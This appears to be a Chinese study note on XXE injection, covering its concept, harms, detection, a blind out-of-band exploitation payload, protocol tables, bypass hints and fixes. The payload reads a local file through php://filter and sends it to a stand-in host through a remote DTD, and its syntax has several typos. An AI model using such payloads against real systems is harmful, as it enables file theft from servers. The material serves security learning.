# 1、概念

XML   传输和存储数据格式类型

XXE    xml的漏洞注入全称（XML External Entity Injection）

XXE漏洞发生在引用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害

DTD文档可以被XML引入，如在DTD自定义攻击语句，用XML引入DTD文件路径

| XML                                        | HTML                                   |
| ------------------------------------------ | -------------------------------------- |
| 被设计为传输和存储数据，其焦点是数据的内容 | 被设计用来显示数据，其焦点是数据的外观 |
| 旨在传输信息                               | 旨在显示信息                           |

# 2、危害

文件读取

RCE执行

内网攻击

DOS攻击

# 3、检测

## 白盒

函数及可控变量查找

传输和存储数据格式类型

## 黑盒

### 人工

数据格式类型判断

​		<user>test</user><pass>Mikasa</pass>

Content-Type值判断

​		text/xml

​		application/xml

更改Content-Type值看返回

### 工具

# 4、利用

## 输出形式

### 有回显

协议

​		http、file、各脚本支持协议

外部引用



### 无回显

利用dnslog测试

外部引用-反向链接配合

（读取文件）

<? xml version="1.0"?>

<! DOCTYPE test[

<!ENTITY & dtd SYSTEM "http://example.com/test.dtd">

*<!ENTITY & file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt">*（读取文件源码）

%dtd;

]> 

test.dtd：

<！ENTITY & payload

​				"<！ENTITY   send SYSTEM     'http://examply.com/?data=%file;'>"

%payload;

## 过滤绕过

http://www.cnblogs.com/20175211lyz/p/11413335.html

协议

（协议-读文件）



外部引用

编码UTF-16BE

# 5、修复

禁用外部实体引用

过滤关键字

WAF产品





协议表

| libxml2 | PHP            | JAVA      | .NET  |
| ------- | -------------- | --------- | ----- |
| file    | file           | http      | file  |
| http    | http           | https     | http  |
| ftp     | ftp            | ftp       | https |
|         | php            | file      | ftp   |
|         | compress.zlib  | jar       |       |
|         | compress.bzip2 | netdoc    |       |
|         | data           | mailto    |       |
|         | glob           | gopher  * |       |
|         | phar           |           |       |



XXE自动注入脚本工具

https://www.cnblogs.com/bmjoker/p/9614990.html(Ruby)